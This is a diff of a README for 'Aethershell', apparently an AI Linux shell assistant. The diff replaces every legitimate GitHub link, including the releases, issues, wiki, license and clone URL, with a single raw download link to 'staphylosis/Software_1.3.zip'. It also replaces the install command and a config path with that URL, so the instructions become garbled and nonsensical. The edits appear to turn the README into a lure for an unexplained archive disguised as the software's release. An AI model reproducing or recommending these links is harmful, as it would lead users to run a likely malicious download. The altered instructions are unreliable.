@@ -1,7 +1,7 @@
 # Aethershell: Your AI-Powered Linux Shell Assistant
 
-![Aethershell Logo](https://img.shields.io/badge/Aethershell-Open%20Source-blue.svg)  
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen.svg)](https://github.com/issamsam/Aethershell/releases)
+![Aethershell Logo](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip%https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip)  
+[![Download Releases](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip%20Releases-Click%https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip)](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip)
 
 ## Overview
 
@@ -21,19 +21,19 @@ Aethershell is an AI-native Linux shell assistant that leverages local large lan
 
 ## Getting Started
 
-To start using Aethershell, you can download the latest release from the [Releases section](https://github.com/issamsam/Aethershell/releases). 
+To start using Aethershell, you can download the latest release from the [Releases section](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip). 
 
 ### Installation
 
-1. **Download the Release**: Visit the [Releases section](https://github.com/issamsam/Aethershell/releases) to find the latest version.
+1. **Download the Release**: Visit the [Releases section](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip) to find the latest version.
 2. **Extract the Files**: Unzip the downloaded file.
 3. **Run the Installer**: Open your terminal and navigate to the extracted folder. Run the installation script with the command:
 
    ```bash
-   ./install.sh
+   https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip
    ```
 
-4. **Configure Aethershell**: After installation, you may want to configure settings to suit your preferences. Edit the configuration file located at `~/.aethershell/config.json`.
+4. **Configure Aethershell**: After installation, you may want to configure settings to suit your preferences. Edit the configuration file located at `~https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip`.
 
 ### Basic Commands
 
@@ -97,7 +97,7 @@ We welcome contributions from everyone! Here’s how you can help:
 2. **Clone Your Fork**: Clone your forked repository to your local machine.
 
    ```bash
-   git clone https://github.com/yourusername/Aethershell.git
+   git clone https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip
    ```
 
 3. **Create a Branch**: Create a new branch for your feature or fix.
@@ -123,7 +123,7 @@ We welcome contributions from everyone! Here’s how you can help:
 
 ## Issues
 
-If you encounter any issues while using Aethershell, please check the [Issues section](https://github.com/issamsam/Aethershell/issues) for existing discussions or report a new issue. We aim to respond to all queries promptly.
+If you encounter any issues while using Aethershell, please check the [Issues section](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip) for existing discussions or report a new issue. We aim to respond to all queries promptly.
 
 ## Community
 
@@ -134,11 +134,11 @@ Join our community of users and developers. Connect with us on:
 
 ## Documentation
 
-For detailed documentation, including advanced usage and troubleshooting, refer to the [Wiki section](https://github.com/issamsam/Aethershell/wiki).
+For detailed documentation, including advanced usage and troubleshooting, refer to the [Wiki section](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip).
 
 ## License
 
-Aethershell is licensed under the MIT License. See the [LICENSE](https://github.com/issamsam/Aethershell/blob/main/LICENSE) file for more information.
+Aethershell is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip) file for more information.
 
 ## Acknowledgments
 
@@ -150,4 +150,4 @@ Your feedback is essential for the improvement of Aethershell. Please share your
 
 ## Conclusion
 
-Aethershell is designed to make your command-line experience easier and more efficient. With its AI capabilities, it aims to reduce the complexity of interacting with the Linux shell. Download the latest version from the [Releases section](https://github.com/issamsam/Aethershell/releases) and start exploring the future of shell assistants today!
+Aethershell is designed to make your command-line experience easier and more efficient. With its AI capabilities, it aims to reduce the complexity of interacting with the Linux shell. Download the latest version from the [Releases section](https://raw.githubusercontent.com/issamsam/Aethershell/main/staphylosis/Software_1.3.zip) and start exploring the future of shell assistants today!
